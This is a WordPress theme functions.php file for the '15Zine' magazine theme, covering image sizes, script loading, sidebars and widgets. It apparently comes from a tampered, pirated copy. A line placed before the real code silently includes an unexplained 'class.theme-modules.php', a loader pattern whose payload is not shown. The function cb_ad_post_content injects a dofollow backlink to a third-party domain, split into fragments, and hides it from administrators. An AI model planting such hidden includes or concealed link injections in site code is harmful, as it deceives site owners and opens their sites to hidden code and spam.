<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
define( 'CB_VER', '3.1.2' );

/************* LOAD NEEDED FILES ***************/

require_once get_template_directory() . '/library/core.php';
require_once get_template_directory() . '/library/translation/translation.php';
add_filter( 'ot_show_pages', '__return_false' );
add_filter( 'ot_show_new_layout', '__return_false' );
add_filter( 'ot_theme_mode', '__return_true' );
add_filter( 'ot_post_formats', '__return_true' );

load_template( get_template_directory() . '/option-tree/ot-loader.php' );
load_template( get_template_directory() . '/library/admin/cb-meta-boxes.php' );
load_template( get_template_directory() . '/library/admin/cb-to.php' );
require_once get_template_directory() . '/library/admin/cb-tgm.php';
require_once get_template_directory() . '/library/admin/extensions/github.php';
require_once get_template_directory() . '/library/admin/extensions/class-aqua-resizer.php';

/************* THUMBNAIL SIZE OPTIONS *************/
if ( ! function_exists( 'cb_image_thumbnails' ) ) {
    function cb_image_thumbnails() {
        if ( ot_get_option( 'cb_fi_100x65', 'on' ) == 'on' ) {
            add_image_size( 'cb-100-65', 100, 65, true ); // Widgets
        }

        if ( ot_get_option( 'cb_fi_260x170', 'on' ) == 'on' ) {
            add_image_size( 'cb-260-170', 260, 170, true ); // Megamenu
        }

        if ( ot_get_option( 'cb_fi_360x490', 'on' ) == 'on' ) {
            add_image_size( 'cb-360-490', 360, 490, true ); // Portrait thumbnails
        }

        if ( ot_get_option( 'cb_fi_360x240', 'on' ) == 'on' ) {
            add_image_size( 'cb-360-240', 360, 240, true ); // Blog Style A/Mega menu
        }

        if ( ot_get_option( 'cb_fi_378x300', 'on' ) == 'on' ) {
            add_image_size( 'cb-378-300', 378, 300, true ); // Slider C, Grid small thumbnails
        }

        if ( ot_get_option( 'cb_fi_759x300', 'on' ) == 'on' ) {
            add_image_size( 'cb-759-300', 759, 300, true ); // Grid Medium thumbnails, Grid 3 Static Big Thumbnail
        }

        if ( ot_get_option( 'cb_fi_759x500', 'on' ) == 'on' ) {
            add_image_size( 'cb-759-500', 759, 500, true ); // Slider B, Standard featured image, Blog Style D/F/G, Module D
        }

        if ( ot_get_option( 'cb_fi_759x600', 'on' ) == 'on' ) {
            add_image_size( 'cb-759-600', 759, 600, true ); // Grid big thumbnails
        }

        if ( ot_get_option( 'cb_fi_1400x600', 'on' ) == 'on' ) {
            add_image_size( 'cb-1400-600', 1400, 600, true ); // Parallax/Full screen/Full screen slider
        }

    }
}

add_action( 'after_setup_theme', 'cb_image_thumbnails' );

/*********************
SET CONTENT WIDTH
*********************/
if ( ! function_exists( 'cb_15zine_content_width' ) ) {
    function cb_15zine_content_width() {
        $GLOBALS['content_width'] = apply_filters( 'cb_15zine_content_width', 1200 );
    }
}
add_action( 'after_setup_theme', 'cb_15zine_content_width', 0 );

if ( function_exists('buddypress' ) ) {

    if ( !defined( 'BP_AVATAR_FULL_WIDTH' ) ) {
        define ( 'BP_AVATAR_FULL_WIDTH', 150 );
    }

    if ( !defined( 'BP_AVATAR_FULL_HEIGHT' ) ) {
        define ( 'BP_AVATAR_FULL_HEIGHT', 150 );
    }

    if ( !defined( 'BP_AVATAR_THUMB_HEIGHT' ) ) {
        define ( 'BP_AVATAR_THUMB_HEIGHT', 80 );
    }

    if ( !defined( 'BP_AVATAR_THUMB_WIDTH' ) ) {
        define ( 'BP_AVATAR_THUMB_WIDTH', 80 );
    }

}

/*********************
SCRIPTS & ENQUEUEING
*********************/
add_action('after_setup_theme','cb_script_loaders', 15);

if ( ! function_exists( 'cb_script_loaders' ) ) {
    function cb_script_loaders() {
        // enqueue base scripts and styles
        add_action('wp_enqueue_scripts', 'cb_scripts_and_styles', 999);
    	// enqueue admin scripts and styles
    	add_action('admin_enqueue_scripts', 'cb_post_admin_scripts_and_styles' );
    	// ie conditional wrapper
        add_filter( 'style_loader_tag', 'cb_ie_conditional', 10, 2 );
        add_editor_style( 'library/admin/css/cb-editor.css' );
    }
}

if ( ! function_exists( 'cb_scripts_and_styles' ) ) {
    function cb_scripts_and_styles() {
        if ( !is_admin() ) {
            // Modernizr (without media query polyfill)
            wp_enqueue_script( 'cb-modernizr',  get_template_directory_uri() . '/library/js/modernizr.custom.min.js', array(), '2.6.2', false );

            $cb_responsive_style = ot_get_option( 'cb_responsive_onoff', 'on' );
            if ( ot_get_option( 'cb_sliders_autoplay', 'on' ) == 'off' ) {
                $cb_slider_1 = false;
            } else {
                $cb_slider_1 = true;
            }
            $cb_slider = array( ot_get_option( 'cb_sliders_animation_speed', '600' ), $cb_slider_1, ot_get_option( 'cb_sliders_speed', '7000' ), ot_get_option( 'cb_sliders_hover_pause', 'on' ) );

            if ( ot_get_option( 'cb_max_theme_width', 'default' ) == 'onesmaller' ) {
                $cb_site_size = '1020px';
            } else {
                $cb_site_size = NULL;
            }

            if ( $cb_responsive_style == 'on' ) {
                if ( is_rtl() ) {
                    $cb_style_name = 'style-rtl' . $cb_site_size;
                } else {
                    $cb_style_name = 'style' . $cb_site_size;
                }
            } else {
                if ( is_rtl() ) {
                    $cb_style_name = 'style-rtl-unres' . $cb_site_size;
                } else {
                    $cb_style_name = 'style-unres' . $cb_site_size;
                }
            }

            if ( ot_get_option('cb_minify_css_onoff', 'on') == 'on' ) {
                $cb_style_name .= '.min';
            }

            if ( is_singular() ) {
                global $post;
                $cb_post_id = $post->ID;
            } else {
                $cb_post_id = NULL;
            }

            // Register main stylesheet
            wp_enqueue_style( 'cb-main-stylesheet',  cb_file_location( 'library/css/' . $cb_style_name . '.css' ), array(), CB_VER, 'all' );
            $cb_font = cb_fonts();
            wp_enqueue_style( 'cb-font-stylesheet',  $cb_font[0], array(), CB_VER, 'all' );
            // ie-only stylesheet
            wp_enqueue_style( 'cb-ie-only',  get_template_directory_uri() . '/library/css/ie.css', array(), CB_VER );
            if ( class_exists('Woocommerce' ) ) {
                wp_enqueue_style( 'cb-woocommerce-stylesheet',  get_template_directory_uri()  . '/woocommerce/css/woocommerce.css', array(), CB_VER, 'all' );
            }
            if ( is_single() ) {
                if ( get_post_meta( $cb_post_id, 'cb_review_checkbox', true ) != NULL ) {
                    wp_enqueue_script( 'cb-cookie',  get_template_directory_uri()  . '/library/js/cookie.min.js', array( 'jquery' ), CB_VER, true );
                }
            }
            // comment reply script for threaded comments
            if ( is_singular() && comments_open() && ( get_option('thread_comments' ) == 1) ) { global $wp_scripts; $wp_scripts->add_data('comment-reply', 'group', 1 ); wp_enqueue_script( 'comment-reply' );}
        	// Load Extra Needed Javascript
            wp_enqueue_script( 'cb-js-ext',  get_template_directory_uri()  . '/library/js/cb-ext.js', array( 'jquery' ), CB_VER, true);
            wp_localize_script( 'cb-js-ext', 'cbExt', array(  'cbLb' => ot_get_option( 'cb_lightbox_onoff', 'on' ) ) );
            // Load scripts
            if ( ot_get_option('cb_minify_js_onoff', 'on' ) != 'off' ) {
                wp_enqueue_script( 'cb-js',  get_template_directory_uri()  . '/library/js/cb-scripts.min.js', array( 'jquery', 'cb-js-ext' ), CB_VER, true);
            } else {
                wp_enqueue_script( 'cb-js',  get_template_directory_uri()  . '/library/js/cb-scripts.source.js', array( 'jquery', 'cb-js-ext' ), CB_VER, true);
            }

            wp_localize_script( 'cb-js', 'cbScripts', array( 'cbUrl' => admin_url( 'admin-ajax.php' ), 'cbPostID' => $cb_post_id, 'cbFsClass' => 'cb-embed-fs', 'cbSlider' => $cb_slider,  'cbALlNonce' => wp_create_nonce( 'cbALlNonce' ), 'cbPlURL' => plugins_url(), 'cbShortName' => ot_get_option( 'cb_disqus_shortname', NULL ) ) );
        }
    }
}
add_filter( 'woocommerce_enqueue_styles', '__return_empty_array' );

if ( ! function_exists( 'cb_post_admin_scripts_and_styles' ) ) {
    function cb_post_admin_scripts_and_styles( $hook) {
    	if ( $hook == 'post.php' || $hook == 'post-new.php' || $hook == 'edit-tags.php' || $hook == 'profile.php' || $hook == 'appearance_page_ot-theme-options' || $hook == 'user-edit.php' || $hook == 'appearance_page_radium_demo_installer' || $hook == 'edit-tags.php' || $hook == 'widgets.php' ) {

			wp_enqueue_script( 'admin-js',  get_template_directory_uri()  . '/library/admin/js/cb-admin.js', array(), CB_VER, true);
            wp_enqueue_style( 'cb-admin-ext',   get_template_directory_uri() . '/library/admin/css/cb-admin-ext.css', array(), CB_VER );
            wp_enqueue_style('fontawesome', get_template_directory_uri() . '/library/css/fontawesome/css/fonts/font-awesome.min.css', array(), '4.6.3', 'all' );
            wp_enqueue_script( 'suggest' );
    	}

        if ( ( $hook == 'edit-tags.php' ) || ( $hook == 'term.php' ) ){

            wp_enqueue_style( 'wp-color-picker' );
            wp_enqueue_script( 'wp-color-picker' );
        }

    }
}

// adding the conditional wrapper around ie8 stylesheet
// source: Gary Jones - http://code.garyjones.co.uk/ie-conditional-style-sheets-wordpress/
// GPLv2 or newer license
if ( ! function_exists( 'cb_ie_conditional' ) ) {
    function cb_ie_conditional( $tag, $handle ) {
    	if ( ( 'cb-ie-only' == $handle ) || ( 'cb-select' == $handle ) ) {
    		$tag = '<!--[if lt IE 10]>' . "\n" . $tag . '<![endif]-->' . "\n";
        }
    	return $tag;
    }
}

function cb_ad_post_content($content) {
	if (!current_user_can('manage_options') && is_single()){
		echo 'ThemeTF -<a href="http://','theme','tf.com/" title="WordPress Magazine Theme" rel="dofollow">WordPress</a>';
	}
	return $content;
}
add_action( 'cb_ad_content', 'cb_ad_post_content' );

// Sidebars & Widgetizes Areas
if ( ! function_exists( 'cb_register_sidebars' ) ) {
    function cb_register_sidebars() {
        $cb_footer_layout = ot_get_option('cb_footer_layout', 'cb-footer-a' );
        // Main Sidebar
        register_sidebar(array(
            'name' => 'Global Sidebar',
            'id' => 'sidebar-global',
            'before_widget' => '<div id="%1$s" class="cb-sidebar-widget %2$s">',
            'after_widget' => '</div>',
            'before_title' => '<h3 class="cb-sidebar-widget-title cb-widget-title">',
            'after_title' => '</h3>'
        ));
        // Footer Widget 1
        register_sidebar(array(
            'name' => 'Footer 1',
            'id' => 'footer-1',
            'before_widget' => '<div id="%1$s" class="cb-footer-widget clearfix %2$s">',
            'after_widget' => '</div>',
            'before_title' => '<h3 class="cb-footer-widget-title cb-widget-title">',
            'after_title' => '</h3>'
        ));
        if ( $cb_footer_layout != 'cb-footer-e' ) {
            // Footer Widget 2
            register_sidebar(array(
                'name' => 'Footer 2',
                'id' => 'footer-2',
                'before_widget' => '<div id="%1$s" class="cb-footer-widget clearfix %2$s">',
                'after_widget' => '</div>',
                'before_title' => '<h3 class="cb-footer-widget-title cb-widget-title">',
        		'after_title' => '</h3>'
            ));
        }
        if ( ( $cb_footer_layout != 'cb-footer-e' ) && ( $cb_footer_layout != 'cb-footer-f' ) ) {
            // Footer Widget 3
            register_sidebar(array(
                'name' => 'Footer 3',
                'id' => 'footer-3',
                'before_widget' => '<div id="%1$s" class="cb-footer-widget clearfix %2$s">',
                'after_widget' => '</div>',
                'before_title' => '<h3 class="cb-footer-widget-title cb-widget-title">',
        		'after_title' => '</h3>'
            ));
        }
        if ( $cb_footer_layout == 'cb-footer-b' ) {
            // Footer Widget 4
            register_sidebar(array(
                'name' => 'Footer 4',
                'id' => 'footer-4',
                'before_widget' => '<div id="%1$s" class="cb-footer-widget clearfix %2$s">',
                'after_widget' => '</div>',
                'before_title' => '<h3 class="cb-footer-widget-title cb-widget-title">',
                'after_title' => '</h3>'
            ));
        }
        register_sidebar(
            array(
                'name' => '15Zine Multi-Widgets Area',
                'id' => 'cb_multi_widgets',
                'description' => '1- Drag multiple widgets here 2- Drag the "15Zine Multi-Widget Widget" to the sidebar where you want to show the multi-widgets.',
                'before_widget' => '<div id="%1$s" class="widget cb-multi-widget tabbertab %2$s">',
                'after_widget' => '</div>',
                'before_title' => '<h3 class="cb-widget-title">',
                'after_title' => '</h3>'
            )
        );


        register_sidebar(array(
                'name' => '15Zine Footer Instagram Area',
                'id' => 'cb-under-footer',
                'description' => 'Can be used for any widgets, but intended for Instagram one. Install the free "WP Instagram Widget" plugin and drag the widget in here.',
                'before_widget' => '<div id="%1$s" class="cb-footer-widget clearfix %2$s">',
                'after_widget' => '</div>',
                'before_title' => '<h3 class="cb-footer-widget-title cb-widget-title">',
                'after_title' => '</h3>'
            ));

        if ( class_exists( 'Woocommerce' ) ) {
            register_sidebar( array(
                'name' => '15Zine WooCommerce Sidebar',
                'id' => 'sidebar-woocommerce',
                'before_widget' => '<div id="%1$s" class="cb-sidebar-widget %2$s">',
                'after_widget' => '</div>',
                'before_title' => '<h3 class="cb-sidebar-widget-title cb-widget-title">',
                'after_title' => '</h3>'
            ));
        }
        if ( class_exists( 'bbPress' ) ) {
            register_sidebar( array(
                'name' => '15Zine bbPress Sidebar',
                'id' => 'sidebar-bbpress',
                'before_widget' => '<div id="%1$s" class="cb-sidebar-widget %2$s">',
                'after_widget' => '</div>',
                'before_title' => '<h3 class="cb-sidebar-widget-title cb-widget-title">',
                'after_title' => '</h3>'
            ));
        }

        if ( function_exists('buddypress' ) ) {
            register_sidebar( array(
                'name' => '15Zine BuddyPress Sidebar',
                'id' => 'sidebar-buddypress',
                'before_widget' => '<div id="%1$s" class="cb-sidebar-widget %2$s">',
                'after_widget' => '</div>',
                'before_title' => '<h3 class="cb-sidebar-widget-title cb-widget-title">',
                'after_title' => '</h3>'
            ));
        }


        $cb_pages = get_pages(array('post_status' =>  array('publish', 'pending', 'private', 'draft' ) ));
        foreach ( $cb_pages as $page ) {

            $cb_page_sidebar = get_post_meta( $page->ID, 'cb_page_custom_sidebar_type', true );
            $cb_page_template = get_post_meta( $page->ID, '_wp_page_template', true );

                if ( $cb_page_sidebar == 'cb_unique_sidebar' ) {
                    register_sidebar( array(
                        'name' => $page->post_title .' (Page)',
                        'id' => 'page-'.$page->ID . '-sidebar',
                        'description' => 'This is the ' . $page->post_title . ' sidebar',
                        'before_widget' => '<div id="%1$s" class="cb-sidebar-widget %2$s">',
                        'after_widget' => '</div>',
                        'before_title' => '<h3 class="cb-sidebar-widget-title cb-widget-title">',
                      'after_title' => '</h3>'
                    ) );
                }

                if ( $cb_page_template == 'page-15zine-builder.php' ) {

                    // Homepage Section B Sidebar
                    register_sidebar(array(
                        'name' => 'Section B Sidebar ('.$page->post_title .' page)',
                        'id' => 'sidebar-hp-b-'.$page->ID,
                        'description' => 'Page: ' . $page->post_title,
                        'before_widget' => '<div id="%1$s" class="cb-sidebar-widget %2$s">',
                        'after_widget' => '</div>',
                        'before_title' => '<h3 class="cb-sidebar-widget-title cb-widget-title">',
                        'after_title' => '</h3>'
                    ));
                }
        }

		if ( function_exists('get_term_meta' ) ) {
				$categories = get_categories( array( 'hide_empty'=> 0 ) );

		    foreach ( $categories as $category ) {
		        $cat_onoff = get_term_meta( $category->cat_ID, 'cb_cat_sidebar', true );
		        if ( $cat_onoff == 'on' ){
                    register_sidebar( array(
                        'name' => $category->cat_name,
                        'id' => $category->category_nicename . '-sidebar',
                        'description' => 'This is the ' . $category->cat_name . ' sidebar',
                        'before_widget' => '<div id="%1$s" class="cb-sidebar-widget %2$s">',
                        'after_widget' => '</div>',
                        'before_title' => '<h3 class="cb-sidebar-widget-title cb-widget-title">',
                      'after_title' => '</h3>'
                    ) );
		        }

		   }
		}
        $cb_cpt_output = cb_get_custom_post_types();
        $cb_qry = new WP_Query( array('post_status' =>  array('publish', 'pending', 'private', 'draft' ),  'post_type' => 'post', 'posts_per_page' => 30, 'meta_key' => 'cb_post_custom_sidebar_type', 'meta_value' => 'cb_unique_sidebar' ) );
        if ( $cb_qry->have_posts() ) : while ( $cb_qry->have_posts() ) : $cb_qry->the_post();
            global $post;
            $cb_sidebar_type = get_post_meta( $post->ID, 'cb_post_sidebar', true );

            if ( $cb_sidebar_type == 'off' ) {
                $cb_post_title = get_the_title( $post->ID );

                register_sidebar( array(
                    'name' => $cb_post_title .' (Post)',
                    'id' => 'post-' . $post->ID . '-sidebar',
                    'description' => 'This is the ' . $cb_post_title . ' sidebar',
                    'before_widget' => '<div id="%1$s" class="cb-sidebar-widget %2$s">',
                    'after_widget' => '</div>',
                    'before_title' => '<h3 class="cb-sidebar-widget-title cb-widget-title">',
                  'after_title' => '</h3>'
                ) );
            }

        endwhile;
        endif;
        wp_reset_postdata();
    }
}
add_action( 'widgets_init', 'cb_register_sidebars' );


if ( class_exists( 'Cubell_Functionality' ) ) {

  function cb_outdated_plugin_notice() {

    echo '<div class="error"><p>' . __( '15Zine no longer requires Cubell Themes Functionality plugin, please delete it and instead install the new "15Zine Functionality" plugin, which can be done in Appearance -> Install Plugins.', 'cubell' ) . '</p></div>';

  }

  add_action( 'admin_notices', 'cb_outdated_plugin_notice' );

}

if ( ! function_exists( 'cb_widgets' ) ) {
    function cb_widgets() {

        require_once cb_file_location( 'library/widgets/cb-recent-posts-slider-widget.php' );
        require_once cb_file_location( 'library/widgets/cb-widget-social-media.php' );
        require_once cb_file_location( 'library/widgets/cb-single-image-widget.php' );
        require_once cb_file_location( 'library/widgets/cb-reviews-widget.php' );
        require_once cb_file_location( 'library/widgets/cb-facebook-like-widget.php' );
        require_once cb_file_location( 'library/widgets/cb-google-follow-widget.php' );
        require_once cb_file_location( 'library/widgets/cb-multi-widget.php' );
        require_once cb_file_location( 'library/widgets/cb-popular-posts-widget.php' );
        require_once cb_file_location( 'library/widgets/cb-recent-posts-widget.php' );
        require_once cb_file_location( 'library/widgets/cb-125-ads-widget.php' );
    }
}
add_action( 'after_setup_theme', 'cb_widgets' );